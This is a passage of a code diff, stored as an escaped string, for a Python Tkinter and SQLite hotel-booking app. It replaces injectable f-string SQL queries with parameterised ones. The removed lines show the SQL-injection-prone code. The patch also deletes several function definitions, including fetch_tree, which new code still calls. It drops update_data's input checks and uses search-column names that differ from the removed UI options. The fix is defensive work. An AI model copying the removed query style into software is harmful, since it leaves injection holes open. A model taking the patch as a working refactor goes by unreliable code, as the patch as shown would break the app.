= '{self.Room_type_var.get()}' AND Availability = 'Yes' AND Room_Status = 'OK'\"\"\")\n-\n-                    data = my_cursor.fetchall()\n-                    mydb.commit()\n-                    mydb.close()\n-\n-                    if len(data) > 0:\n-                        Allotted_room_label_combobox[\"values\"] = (\"\")\n-                        Allotted_room_label_combobox.set(\"\")\n-                        Allotted_room_label_combobox[\"values\"] = data\n-\n-                    else:\n-                        Allotted_room_label_combobox[\"values\"] = (\"\")\n-                        Allotted_room_label_combobox.set(\"Not Available\")\n-\n-                except Exception as e:\n-                    messagebox.showerror(\"Error\", f\"Something went Wrong {str(e)}\", parent=self.rooms)\n-\n-            elif self.Room_type_var.get() == room_type_list[2]:\n-                try:\n-                    mydb = sqlite3.connect(\"hotel_management_system.db\")\n-                    my_cursor = mydb.cursor()\n-\n-                    my_cursor.execute(f\"\"\"SELECT Room_No FROM room_types WHERE Room_Type = '{self.Room_type_var.get()}' AND Availability = 'Yes' AND Room_Status = 'OK'\"\"\")\n-\n-                    data = my_cursor.fetchall()\n-                    mydb.commit()\n-                    mydb.close()\n-\n-                    if len(data) > 0:\n-                        Allotted_room_label_combobox[\"values\"] = (\"\")\n-                        Allotted_room_label_combobox.set(\"\")\n-                        Allotted_room_label_combobox[\"values\"] = data\n-\n-                    else:\n-                        Allotted_room_label_combobox[\"values\"] = (\"\")\n-                        Allotted_room_label_combobox.set(\"Not Available\")\n-\n-                except Exception as e:\n-                    messagebox.showerror(\"Error\", f\"Something went Wrong {str(e)}\", parent=self.rooms)\n-\n-            elif self.Room_type_var.get() == room_type_list[3]:\n-                try:\n-                    mydb = sqlite3.connect(\"hotel_management_system.db\")\n-                    my_cursor = mydb.cursor()\n-\n-                    my_cursor.execute(f\"\"\"SELECT Room_No FROM room_types WHERE Room_Type = '{self.Room_type_var.get()}' AND Availability = 'Yes' AND Room_Status = 'OK'\"\"\")\n-\n-                    data = my_cursor.fetchall()\n-                    mydb.commit()\n-                    mydb.close()\n-\n-                    if len(data) > 0:\n-                        Allotted_room_label_combobox[\"values\"] = (\"\")\n-                        Allotted_room_label_combobox.set(\"\")\n-                        Allotted_room_label_combobox[\"values\"] = data\n-\n-                    else:\n-                        Allotted_room_label_combobox[\"values\"] = (\"\")\n-                        Allotted_room_label_combobox.set(\"Not Available\")\n-\n-                except Exception as e:\n-                    messagebox.showerror(\"Error\", f\"Something went Wrong {str(e)}\", parent=self.rooms)\n-\n-            elif self.Room_type_var.get() == room_type_list[4]:\n-                try:\n-                    mydb = sqlite3.connect(\"hotel_management_system.db\")\n-                    my_cursor = mydb.cursor()\n-\n-                    my_cursor.execute(f\"\"\"SELECT Room_No FROM room_types WHERE Room_Type = '{self.Room_type_var.get()}' AND Availability = 'Yes' AND Room_Status = 'OK'\"\"\")\n-\n-                    data = my_cursor.fetchall()\n-                    mydb.commit()\n-                    mydb.close()\n-\n-                    if len(data) > 0:\n-                        Allotted_room_label_combobox[\"values\"] = (\"\")\n-                        Allotted_room_label_combobox.set(\"\")\n-                        Allotted_room_label_combobox[\"values\"] = data\n-\n-                    else:\n-                        Allotted_room_label_combobox[\"values\"] = (\"\")\n-                        Allotted_room_label_combobox.set(\"Not Available\")\n-\n-                except Exception as e:\n-                    messagebox.showerror(\"Error\", f\"Something went Wrong {str(e)}\", parent=self.rooms)\n+            try:\n+                mydb = sqlite3.connect(\"hotel_management_system.db\")\n+                my_cursor = mydb.cursor()\n+                my_cursor.execute(\n+                    \"SELECT Room_No FROM room_types WHERE Room_Type = ? AND Availability = 'Yes' AND Room_Status = 'OK'\",\n+                    (self.Room_type_var.get(),)\n+                )\n+                data = my_cursor.fetchall()\n+                mydb.commit()\n+                mydb.close()\n+                if len(data) > 0:\n+                    Allotted_room_label_combobox[\"values\"] = (\"\")\n+                    Allotted_room_label_combobox.set(\"\")\n+                    Allotted_room_label_combobox[\"values\"] = data\n+                else:\n+                    Allotted_room_label_combobox[\"values\"] = (\"\")\n+                    Allotted_room_label_combobox.set(\"Not Available\")\n+            except Exception as e:\n+                messagebox.showerror(\"Error\", f\"Something went Wrong {str(e)}\", parent=self.rooms)\n \n         def fetch_contact():\n             if self.Customer_Contact_No_var.get() == \"\" or self.Customer_Contact_No_var.get() == 0:\n                 messagebox.showerror(\"Error\", \"Contact entry is Empty! Please fill the Contact Details\", parent=self.rooms)\n                 Customer_Contact_No_label_entry.delete(0, END)\n-\n             else:\n                 try:\n                     mydb = sqlite3.connect(\"hotel_management_system.db\")\n                     my_cursor = mydb.cursor()\n-\n-                    my_cursor.execute(f\"SELECT Customer_ID, * FROM customer WHERE Contact_No = {self.Customer_Contact_No_var.get()}\")\n-\n+                    my_cursor.execute(\n+                        \"SELECT Customer_ID, * FROM customer WHERE Contact_No = ?\",\n+                        (self.Customer_Contact_No_var.get(),)\n+                    )\n                     data = my_cursor.fetchall()\n-\n                     mydb.commit()\n                     mydb.close()\n-\n-                    if data==None:\n+                    if not data:\n                         messagebox.showinfo(\"Empty\", \"No data found\", parent=self.rooms)\n-\n                     else:\n                         try:\n                             mydb = sqlite3.connect(\"hotel_management_system.db\")\n                             my_cursor = mydb.cursor()\n-\n-                            my_cursor.execute(f\"SELECT Customer_Name FROM customer WHERE Contact_No = {self.Customer_Contact_No_var.get()}\")\n+                            my_cursor.execute(\n+                                \"SELECT Customer_Name FROM customer WHERE Contact_No = ?\",\n+                                (self.Customer_Contact_No_var.get(),)\n+                            )\n                             val = my_cursor.fetchone()\n                             self.customer_name_var.set(val[0])\n-\n-                            my_cursor.execute(f\"SELECT Customer_ID FROM customer WHERE Contact_No = {self.Customer_Contact_No_var.get()}\")\n+                            my_cursor.execute(\n+                                \"SELECT Customer_ID FROM customer WHERE Contact_No = ?\",\n+                                (self.Customer_Contact_No_var.get(),)\n+                            )\n                             val = my_cursor.fetchone()\n                             self.customer_id_no_var.set(val[0])\n-\n-                            my_cursor.execute(f\"SELECT Sex FROM customer WHERE Contact_No = {self.Customer_Contact_No_var.get()}\")\n+                            my_cursor.execute(\n+                                \"SELECT Sex FROM customer WHERE Contact_No = ?\",\n+                                (self.Customer_Contact_No_var.get(),)\n+                            )\n                             val = my_cursor.fetchone()\n                             self.sex_type_var.set(val[0])\n-\n-                            my_cursor.execute(f\"SELECT eMail FROM customer WHERE Contact_No = {self.Customer_Contact_No_var.get()}\")\n+                            my_cursor.execute(\n+                                \"SELECT eMail FROM customer WHERE Contact_No = ?\",\n+                                (self.Customer_Contact_No_var.get(),)\n+                            )\n                             val = my_cursor.fetchone()\n                             self.email_id_var.set(val[0])\n-\n-                            my_cursor.execute(f\"SELECT Nationality FROM customer WHERE Contact_No = {self.Customer_Contact_No_var.get()}\")\n+                            my_cursor.execute(\n+                                \"SELECT Nationality FROM customer WHERE Contact_No = ?\",\n+                                (self.Customer_Contact_No_var.get(),)\n+                            )\n                             val = my_cursor.fetchone()\n                             self.nationality_type_var.set(val[0])\n-\n-                            my_cursor.execute(f\"SELECT ID_Type FROM customer WHERE Contact_No = {self.Customer_Contact_No_var.get()}\")\n+                            my_cursor.execute(\n+                                \"SELECT ID_Type FROM customer WHERE Contact_No = ?\",\n+                                (self.Customer_Contact_No_var.get(),)\n+                            )\n                             val = my_cursor.fetchone()\n                             self.id_type_var.set(val[0])\n-\n-                            my_cursor.execute(f\"SELECT Pin_Code FROM customer WHERE Contact_No = {self.Customer_Contact_No_var.get()}\")\n+                            my_cursor.execute(\n+                                \"SELECT Pin_Code FROM customer WHERE Contact_No = ?\",\n+                                (self.Customer_Contact_No_var.get(),)\n+                            )\n                             val = my_cursor.fetchone()\n                             self.pin_code_var.set(val[0])\n-\n                         except Exception as e:\n                             messagebox.showerror(\"Error\", f\"Something went Wrong!!! {str(e)}\")\n-\n                     mydb.commit()\n                     mydb.close()\n                 except Exception as e:\n                     messagebox.showerror(\"Error\", f\"Something went Wrong!!! {str(e)}\", parent=self.rooms)\n \n-        def clear_function():\n-            self.customer_name_var.set(\"\")\n-            self.customer_id_no_var.set(\"\")\n-            self.sex_type_var.set(\"\")\n-            self.email_id_var.set(\"\")\n-            self.nationality_type_var.set(\"\")\n-            self.id_type_var.set(\"\")\n-            self.pin_code_var.set(\"\")\n-\n         def add_data():\n             mydb = sqlite3.connect(\"hotel_management_system.db\")\n             my_cursor = mydb.cursor()\n             if self.Customer_Contact_No_var.get() == \"\" or self.Customer_Contact_No_var.get() == 0:\n                 messagebox.showerror(\"Error\", \"Contact entry is Empty! Please fill the Contact Details\", parent=self.rooms)\n                 Customer_Contact_No_label_entry.delete(0, END)\n-\n             else:\n                 try:\n-                    my_cursor.execute(f\"SELECT Customer_Name FROM customer WHERE Contact_No = {self.Customer_Contact_No_var.get()}\")\n+                    my_cursor.execute(\n+                        \"SELECT Customer_Name FROM customer WHERE Contact_No = ?\",\n+                        (self.Customer_Contact_No_var.get(),)\n+                    )\n                     val = my_cursor.fetchone()\n                     self.customer_name_var.set(val[0])\n                     mydb.commit()\n@@ -344,34 +225,21 @@\n \n                     mydb = sqlite3.connect(\"hotel_management_system.db\")\n                     my_cursor = mydb.cursor()\n-\n-                    \"\"\"\n-                    self.Customer_Contact_No_var = IntVar()\n-                    self.Customer_Check_In_var = StringVar()\n-                    self.Customer_Check_Out_var = StringVar()\n-                    self.Room_type_var = StringVar()\n-                    self.Available_room_var = IntVar()\n-                    self.Meal_type_var = StringVar()\n-                    self.No_of_day_var = IntVar()\n-                    self.Tax_var = IntVar()\n-                    self.Sub_total_var = IntVar()\n-                    self.Total_var = IntVar()\n-                    \"\"\"\n-\n                     my_cursor.execute(\n-                        \"INSERT INTO room_booking VALUES (:booking_id, :cust_id, :name, :contact_no, :check_in, :check_out, :room_type, :allotted_room, :meal, :no_of_days)\",\n-                        {\n-                            'booking_id': self.Customer_Booking_ID_var.get(),\n-                            'cust_id': self.customer_id_no_var.get(),\n-                            'name': self.customer_name_var.get(),\n-                            'contact_no': self.Customer_Contact_No_var.get(),\n-                            'check_in': self.Customer_Check_In_var.get(),\n-                            'check_out': self.Customer_Check_Out_var.get(),\n-                            'room_type': self.Room_type_var.get(),\n-                            'allotted_room': self.Allotted_room_var.get(),\n-                            'meal': self.Plan_type_var.get(),\n-                            'no_of_days': self.No_of_day_var.get(),\n-                        })\n+                        \"INSERT INTO room_booking VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)\",\n+                        (\n+                            self.Customer_Booking_ID_var.get(),\n+                            self.customer_id_no_var.get(),\n+                            self.customer_name_var.get(),\n+                            self.Customer_Contact_No_var.get(),\n+                            self.Customer_Check_In_var.get(),\n+                            self.Customer_Check_Out_var.get(),\n+                            self.Room_type_var.get(),\n+                            self.Allotted_room_var.get(),\n+                            self.Plan_type_var.get(),\n+                            self.No_of_day_var.get(),\n+                        )\n+                    )\n                     mydb.commit()\n                     mydb.close()\n                     messagebox.showinfo(\"Successful\", \"Data has been added Successfully!\", parent=self.rooms)\n@@ -381,73 +249,42 @@\n                 fetch_tree()\n \n         def update_data():\n-            if self.Customer_Contact_No_var.get() == \"\" or self.Customer_Contact_No_var.get() == 0:\n-                messagebox.showerror(\"Error\", \"Please enter Valid Contact No.\", parent=self.rooms)\n-\n-            elif self.Customer_Check_In_var.get() == \"\" or self.Customer_Check_In_var.get() == 0:\n-                messagebox.showerror(\"Error\", \"Please enter Valid Check In Date\", parent=self.rooms)\n-\n-            elif self.Customer_Check_Out_var.get() == \"\" or self.Customer_Check_Out_var.get() == 0:\n-                messagebox.showerror(\"Error\", \"Please enter Valid Check Out Date\", parent=self.rooms)\n-\n-            elif self.Room_type_var.get() == \"\" or self.Room_type_var.get() == 0:\n-                messagebox.showerror(\"Error\", \"Please enter Valid Room Type\", parent=self.rooms)\n-\n-            elif self.Allotted_room_var.get() == \"\" or self.Allotted_room_var.get() == 0:\n-                messagebox.showerror(\"Error\", \"Please enter Valid Allotted Rooms\", parent=self.rooms)\n-\n-            elif self.Plan_type_var.get() == \"\" or self.Plan_type_var.get() == 0:\n-                messagebox.showerror(\"Error\", \"Please enter Valid Meal Types\", parent=self.rooms)\n-\n-            elif self.No_of_day_var.get() == \"\" or self.No_of_day_var.get() == 0:\n-                messagebox.showerror(\"Error\", \"Please enter Valid Number of Days\", parent=self.rooms)\n-\n-            elif self.customer_name_var.get() == \"\" or self.customer_id_no_var.get() == \"\":\n-                messagebox.showerror(\"Error\", \"Name & Ref No. is not fetched! Please Fetch Name and Ref No.\", parent=self.rooms)\n-\n-            else:\n-                querry = messagebox.askyesno(\"Are You Sure?\", \"Are You sure! You want to update this data?\", parent=self.rooms)\n-                if querry == 1:\n-                    try:\n-                        mydb = sqlite3.connect(\"hotel_management_system.db\")\n-                        my_cursor = mydb.cursor()\n-\n-                        my_cursor.execute(\"\"\"UPDATE room_booking SET\n-                                            Customer_ID = :cust_id,\n-                                            Name = :name,\n-                                            Contact_No = :contact,\n-                                            Check_In = :check_in,\n-                                            Check_Out = :check_out,\n-                                            Room_Type = :room_type,\n-                                            Allotted_Room = :allotted,\n-                                            Meal = :meal,\n-                                            No_of_Days = :no_of_d\n-                                            \n-                                            WHERE Booking_ID = :oid\"\"\",\n-                                          {\n-                                              'cust_id': self.customer_id_no_var.get(),\n-                                              'name': self.customer_name_var.get(),\n-                                              'contact': self.Customer_Contact_No_var.get(),\n-                                              'check_in': self.Customer_Check_In_var.get(),\n-                                              'check_out': self.Customer_Check_Out_var.get(),\n-                                              'room_type': self.Room_type_var.get(),\n-                                              'allotted': self.Allotted_room_var.get(),\n-                                              'meal': self.Plan_type_var.get(),\n-                                              'no_of_d': self.No_of_day_var.get(),\n-                                              'oid': self.Customer_Booking_ID_var.get()\n-                                          })\n-                        mydb.commit()\n-                        mydb.close()\n-                        fetch_tree()\n-                        messagebox.showinfo(\"Successful\", \"Data has been updated Successfully!!\", parent=self.rooms)\n-                        booked_room_no()\n-\n-                    except Exception as e:\n-                        messagebox.showerror(\"Error\", f\"Something went Wrong {str(e)}\", parent=self.rooms)\n-\n-                else:\n-                    pass\n-\n+            querry = messagebox.askyesno(\"Are You Sure?\", \"Are You sure! You want to update this data?\", parent=self.rooms)\n+            if querry == 1:\n+                try:\n+                    mydb = sqlite3.connect(\"hotel_management_system.db\")\n+                    my_cursor = mydb.cursor()\n+                    my_cursor.execute(\"\"\"UPDATE room_booking SET\n+                        Customer_ID = ?,\n+                        Name = ?,\n+                        Contact_No = ?,\n+                        Check_In = ?,\n+                        Check_Out = ?,\n+                        Room_Type = ?,\n+                        Allotted_Room = ?,\n+                        Meal = ?,\n+                        No_of_Days = ?\n+                        WHERE Booking_ID = ?\"\"\",\n+                        (\n+                            self.customer_id_no_var.get(),\n+                            self.customer_name_var.get(),\n+                            self.Customer_Contact_No_var.get(),\n+                            self.Customer_Check_In_var.get(),\n+                            self.Customer_Check_Out_var.get(),\n+                            self.Room_type_var.get(),\n+                            self.Allotted_room_var.get(),\n+                            self.Plan_type_var.get(),\n+                            self.No_of_day_var.get(),\n+                            self.Customer_Booking_ID_var.get()\n+                        )\n+                    )\n+                    mydb.commit()\n+                    mydb.close()\n+                    fetch_tree()\n+                    messagebox.showinfo(\"Successful\", \"Data has been updated Successfully!!\", parent=self.rooms)\n+                    booked_room_no()\n+                except Exception as e:\n+                    messagebox.showerror(\"Error\", f\"Something went Wrong {str(e)}\", parent=self.rooms)\n             fetch_tree()\n \n         def delete_data():\n@@ -456,326 +293,76 @@\n                 try:\n                     mydb = sqlite3.connect(\"hotel_management_system.db\")\n                     my_cursor = mydb.cursor()\n-\n-                    my_cursor.execute(f\"DELETE FROM room_booking WHERE Booking_ID = {self.Customer_Booking_ID_var.get()}\")\n-\n+                    my_cursor.execute(\n+                        \"DELETE FROM room_booking WHERE Booking_ID = ?\",\n+                        (self.Customer_Booking_ID_var.get(),)\n+                    )\n                     mydb.commit()\n                     mydb.close()\n                     fetch_tree()\n-\n                     messagebox.showinfo(\"Deleted\", \"Your data has been Deleted!!\", parent=self.rooms)\n-\n                 except Exception as e:\n                     messagebox.showerror(\"Error\", f\"Something went Wrong {str(e)}\", parent=self.rooms)\n \n-            else:\n-                pass\n-\n-        def reset_button():\n-            x = random.randint(10000, 90000)\n-            self.Customer_Booking_ID_var.set(x)\n-            self.Customer_Contact_No_var.set(0)\n-            self.Customer_Check_In_var.set(\"\")\n-            self.Customer_Check_Out_var.set(\"\")\n-            self.Room_type_var.set(\"\")\n-            self.Allotted_room_var.set(0)\n-            self.Plan_type_var.set(\"\")\n-            self.No_of_day_var.set(0)\n-            self.Tax_var.set(0)\n-            self.Sub_total_var.set(0)\n-            self.Total_var.set(0)\n-\n-            self.customer_name_var.set(\"\")\n-            self.customer_id_no_var.set(\"\")\n-            self.sex_type_var.set(\"\")\n-            self.email_id_var.set(\"\")\n-            self.nationality_type_var.set(\"\")\n-            self.id_type_var.set(\"\")\n-            self.pin_code_var.set(\"\")\n-\n-            fetch_tree()\n-\n-        def create_bill():\n-            try:\n-                check_in = self.Customer_Check_In_var.get()\n-                check_out = self.Customer_Check_Out_var.get()\n-                check_in = datetime.datetime.strptime(check_in, \"%d/%m/%Y\")\n-                check_out = datetime.datetime.strptime(check_out, \"%d/%m/%Y\")\n-                self.No_of_day_var.set(abs(check_out - check_in).days)\n-\n-                accommodation_list = list(accommodation.keys())\n-                room_type_list = list(room_type.keys())\n-\n-                for i in accommodation_list:\n-                    for j in room_type_list:\n-                        if self.Room_type_var.get() == j and self.Plan_type_var.get() == i:\n-                            single_day_fare = float(accommodation[self.Plan_type_var.get()] + room_type[self.Room_type_var.get()])\n-                            total_fare = float(single_day_fare * float(self.No_of_day_var.get()))\n-\n-                            tax_fare = total_fare * 0.1\n-                            sub_total = total_fare\n-                            total_payment = float(tax_fare + sub_total)\n-\n-                            self.Sub_total_var.set(int(sub_total))\n-                            self.Tax_var.set(int(tax_fare))\n-                            self.Total_var.set(int(total_payment))\n-\n-                bill = messagebox.askyesno(\"Bill\", \"Bill has been Generated. Do you ant to save the bill?\", parent=self.rooms)\n-                if bill == 1:\n-                    generate_bill_data()\n-\n-                else:\n-                    pass\n-\n-            except Exception as e:\n-                messagebox.showerror(\"Error\", \"Something Went Wrong...! Please Check Your Entries...!\", parent=self.rooms)\n-\n-        def generate_bill_data():\n-            try:\n-                start = 19\n-                stop = 29\n-                data = \"\"\n-                for i in range(3):\n-                    val = random.randint(start, stop)\n-                    data = data + str(val)\n-\n-                bill_id = int(data)\n-                mydb = sqlite3.connect(\"hotel_management_system.db\")\n-                my_cursor = mydb.cursor()\n-\n-                my_cursor.execute(\"INSERT INTO bills VALUES (:bill_no, :name, :cust_id, :check_in, :check_out, :room_type, :allotted_room, :meal_type, :no_of_days, :sub_amount, :tax_amount, :total_amount)\",\n-                                  {\n-                                      'bill_no': bill_id,\n-                                      'name': self.customer_name_var.get(),\n-                                      'cust_id': self.customer_id_no_var.get(),\n-                                      'check_in': self.Customer_Check_In_var.get(),\n-                                      'check_out': self.Customer_Check_Out_var.get(),\n-                                      'room_type': self.Room_type_var.get(),\n-                                      'allotted_room': self.Allotted_room_var.get(),\n-                                      'meal_type': self.Plan_type_var.get(),\n-                                      'no_of_days': self.No_of_day_var.get(),\n-                                      'sub_amount': self.Sub_total_var.get(),\n-                                      'tax_amount': self.Tax_var.get(),\n-                                      'total_amount': self.Total_var.get()\n-                                  })\n-\n-                mydb.commit()\n-                mydb.close()\n-                messagebox.showinfo(\"Bill\", \"Bill has been Generated. Data has been saved to your DateBase.\", parent=self.rooms)\n-\n-            except Exception as e:\n-                messagebox.showerror(\"Error\", f\"Something went Wrong{str(e)}\", parent=self.rooms)\n-\n-        def fetch_tree():\n-            mydb = sqlite3.connect(\"hotel_management_system.db\")\n-            my_cursor = mydb.cursor()\n-\n-            my_cursor.execute(\"SELECT * FROM room_booking\")\n-            data = my_cursor.fetchall()\n-\n-            if len(data) != 0:\n-                self.Room_details_table.delete(*self.Room_details_table.get_children())\n-                for i in data:\n-                    self.Room_details_table.insert(\"\", END, value=i)\n-                mydb.commit()\n-            mydb.close()\n-\n-        def get_tree_data(event):\n-            try:\n-                cursor_row = self.Room_details_table.focus()\n-                content = self.Room_details_table.item(cursor_row)\n-                content_value = content[\"values\"]\n-\n-                self.Customer_Booking_ID_var.set(int(content_value[0])),\n-                self.customer_id_no_var.set(content_value[1]),\n-                self.customer_name_var.set(content_value[2]),\n-                self.Customer_Contact_No_var.set(int(content_value[3])),\n-                self.Customer_Check_In_var.set(content_value[4]),\n-                self.Customer_Check_Out_var.set(content_value[5]),\n-                self.Room_type_var.set(content_value[6]),\n-                self.Allotted_room_var.set(int(content_value[7])),\n-                self.Plan_type_var.set(content_value[8]),\n-                self.No_of_day_var.set(int(content_value[9]))\n-\n-                fetch_contact()\n-\n-                self.Sub_total_var.set(0)\n-                self.Tax_var.set(0)\n-                self.Total_var.set(0)\n-\n-            except:\n-                pass\n-\n-        def search_attribute(event):\n-            if self.search_by_table_var.get() == \"Name\":\n-                Search_by_attribute_combobox[\"values\"] = (\"\")\n-                Search_by_attribute_combobox.set(\"\")\n-                Search_by_attribute_combobox.config(state=NORMAL)\n-\n-            elif self.search_by_table_var.get() == \"Check In\":\n-                Search_by_attribute_combobox[\"values\"] = (\"\")\n-                Search_by_attribute_combobox.set(\"\")\n-                Search_by_attribute_combobox.config(state=NORMAL)\n-\n-            elif self.search_by_table_var.get() == \"Check Out\":\n-                Search_by_attribute_combobox[\"values\"] = (\"\")\n-                Search_by_attribute_combobox.set(\"\")\n-                Search_by_attribute_combobox.config(state=NORMAL)\n-\n-            elif self.search_by_table_var.get() == \"Room Type\":\n-                Search_by_attribute_combobox[\"values\"] = list(room_type.keys())\n-                Search_by_attribute_combobox.set(\"\")\n-                Search_by_attribute_combobox.config(state=\"readonly\")\n-\n-            elif self.search_by_table_var.get() == \"Allotted Room\":\n-                Search_by_attribute_combobox[\"values\"] = (\"\")\n-                Search_by_attribute_combobox.set(\"\")\n-                Search_by_attribute_combobox.config(state=NORMAL)\n-\n-            elif self.search_by_table_var.get() == \"Meal\":\n-                Search_by_attribute_combobox[\"values\"] = list(accommodation.keys())\n-                Search_by_attribute_combobox.set(\"\")\n-                Search_by_attribute_combobox.config(state=\"readonly\")\n-\n-            else:\n-                pass\n-\n         def search():\n             mydb = sqlite3.connect(\"hotel_management_system.db\")\n             my_cursor = mydb.cursor()\n-\n             if Search_by_table_name_combobox.get() == \"\" or Search_by_attribute_combobox.get() == \"\":\n                 messagebox.showerror(\"Error\", \"Invalid Entry!! Please check your Values\", parent=self.rooms)\n-\n             else:\n                 try:\n-                    if self.search_by_table_var.get() == \"Name\":\n+                    allowed_columns = [\"Name\", \"Check_In\", \"Check_Out\", \"Room_Type\", \"Allotted_Room\", \"Meal\"]\n+                    column = self.search_by_table_var.get()\n+                    if column not in allowed_columns:\n+                        messagebox.showerror(\"Error\", \"Invalid search column\", parent=self.rooms)\n+                        return\n+                    if column == \"Allotted_Room\":\n                         my_cursor.execute(\n-                            f\"SELECT * FROM room_booking WHERE {self.search_by_table_var.get()} = '{self.search_by_attribute_var.get()}'\")\n-                        data = my_cursor.fetchall()\n-                        if len(data) >= 1:\n-                            self.Room_details_table.delete(*self.Room_details_table.get_children())\n-                            for i in data:\n-                                self.Room_details_table.insert(\"\", END, values=i)\n-\n-                        else:\n-                            self.Room_details_table.delete(*self.Room_details_table.get_children())\n-                            mydb.commit()\n-                        mydb.close()\n-\n-                    elif self.search_by_table_var.get() == \"Check In\":\n-                        my_cursor.execute(\n-                            f\"SELECT * FROM room_booking WHERE Check_In = '{self.search_by_attribute_var.get()}'\")\n-                        data = my_cursor.fetchall()\n-                        if len(data) >= 1:\n-                            self.Room_details_table.delete(*self.Room_details_table.get_children())\n-                            for i in data:\n-                                self.Room_details_table.insert(\"\", END, values=i)\n-\n-                        else:\n-                            self.Room_details_table.delete(*self.Room_details_table.get_children())\n-                            mydb.commit()\n-                        mydb.close()\n-\n-                    elif self.search_by_table_var.get() == \"Check Out\":\n-                        my_cursor.execute(\n-                            f\"SELECT * FROM room_booking WHERE Check_Out = '{self.search_by_attribute_var.get()}'\")\n-                        data = my_cursor.fetchall()\n-                        if len(data) >= 1:\n-                            self.Room_details_table.delete(*self.Room_details_table.get_children())\n-                            for i in data:\n-                                self.Room_details_table.insert(\"\", END, values=i)\n-\n-                        else:\n-                            self.Room_details_table.delete(*self.Room_details_table.get_children())\n-                            mydb.commit()\n-                        mydb.close()\n-\n-                    elif self.search_by_table_var.get() == \"Room Type\":\n-                        my_cursor.execute(\n-                            f\"SELECT * FROM room_booking WHERE Room_Type = '{self.search_by_attribute_var.get()}'\")\n-                        data = my_cursor.fetchall()\n-                        if len(data) >= 1:\n-                            self.Room_details_table.delete(*self.Room_details_table.get_children())\n-                            for i in data:\n-                                self.Room_details_table.insert(\"\", END, values=i)\n-\n-                        else:\n-                            self.Room_details_table.delete(*self.Room_details_table.get_children())\n-                            mydb.commit()\n-                        mydb.close()\n-\n-                    elif self.search_by_table_var.get() == \"Allotted Room\":\n-                        my_cursor.execute(\n-                            f\"SELECT * FROM room_booking WHERE Allotted_Room = {self.search_by_attribute_var.get()}\")\n-                        data = my_cursor.fetchall()\n-                        if len(data) >= 1:\n-                            self.Room_details_table.delete(*self.Room_details_table.get_children())\n-                            for i in data:\n-                                self.Room_details_table.insert(\"\", END, values=i)\n-\n-                        else:\n-                            self.Room_details_table.delete(*self.Room_details_table.get_children())\n-                            mydb.commit()\n-                        mydb.close()\n-\n-                    elif self.search_by_table_var.get() == \"Meal\":\n+                            f\"SELECT * FROM room_booking WHERE {column} = ?\",\n+                            (int(self.search_by_attribute_var.get()),)\n+                        )\n+                    else:\n                         my_cursor.execute(\n-                            f\"SELECT * FROM room_booking WHERE {self.search_by_table_var.get()} = '{self.search_by_attribute_var.get()}'\")\n-                        data = my_cursor.fetchall()\n-                        if len(data) >= 1:\n-                            self.Room_details_table.delete(*self.Room_details_table.get_children())\n-                            for i in data:\n-                                self.Room_details_table.insert(\"\", END, values=i)\n-\n-                        else:\n-                            self.Room_details_table.delete(*self.Room_details_table.get_children())\n-                            mydb.commit()\n-                        mydb.close()\n-\n+                            f\"SELECT * FROM room_booking WHERE {column} = ?\",\n+                            (self.search_by_attribute_var.get(),)\n+                        )\n+                    data = my_cursor.fetchall()\n+                    if len(data) >= 1:\n+                        self.Room_details_table.delete(*self.Room_details_table.get_children())\n+                        for i in data:\n+                            self.Room_details_table.insert(\"\", END, values=i)\n                     else:\n-                        pass\n-\n+                        self.Room_details_table.delete(*self.Room_details_table.get_children())\n+                        mydb.commit()\n+                    mydb.close()\n                 except Exception as e:\n                     messagebox.showerror(\"Error\", f\"Something went Wrong {str(e)}\", parent=self.rooms)\n \n-        def show_all():\n-            fetch_tree()\n-            self.search_by_table_var.set(\"\")\n-            self.search_by_attribute_var.set(\"\")\n-            Search_by_attribute_combobox[\"values\"] = (\"\")\n-            Search_by_attribute_combobox.config(state=NORMAL)\n-\n         def booked_room_no():\n             day_counter = check_day(self.Customer_Check_Out_var.get())\n-            if day_counter == 1:\n-                try:\n-                    mydb = sqlite3.connect(\"hotel_management_system.db\")\n-                    my_cursor = mydb.cursor()\n-\n-                    my_cursor.execute(f\"\"\"UPDATE room_types SET Availability = 'No' WHERE Room_No = {self.Allotted_room_var.get()}\"\"\")\n-\n-                    mydb.commit()\n-                    mydb.close()\n-                except Exception as e:\n-                    messagebox.showerror(\"Error\", f\"Something Went Wrong {str(e)}\", parent=self.rooms)\n-            else:\n-                try:\n-                    mydb = sqlite3.connect(\"hotel_management_system.db\")\n-                    my_cursor = mydb.cursor()\n-                    my_cursor.execute(f\"\"\"UPDATE room_types SET Availability = 'Yes' WHERE Room_No = {self.Allotted_room_var.get()}\"\"\")\n-                    mydb.commit()\n-                    mydb.close()\n-                except Exception as e:\n-                    messagebox.showerror(\"Error\", f\"Something Went Wrong {str(e)}\", parent=self.rooms)\n+            try:\n+                mydb = sqlite3.connect(\"hotel_management_system.db\")\n+                my_cursor = mydb.cursor()\n+                if day_counter == 1:\n+                    my_cursor.execute(\n+                        \"UPDATE room_types SET Availability = 'No' WHERE Room_No = ?\",\n+                        (self.Allotted_room_var.get(),)\n+                    )\n+                else:\n+                    my_cursor.execute(\n+                        \"UPDATE room_types SET Availability = 'Yes' WHERE Room_No = ?\",\n+                        (self.Allotted_room_var.get(),)\n+                    )\n+                mydb.commit()\n+                mydb.close()\n+            except Exception as e:\n+                messagebox.showerror(\"Error\", f\"Something Went Wrong {str(e)}\", parent=self.rooms)\n \n         def check_day(data):\n             _today = datetime.datetime.now()\n             _today = str(_today.date())\n             _today = datetime.datetime.strptime(_today, \"%Y-%m-%d\")\n-\n             data = datetime.datetime.strptime(data, \"%d/%m/%Y\")\n-\n             if data > _today:\n                 return 1\n             else:\n",
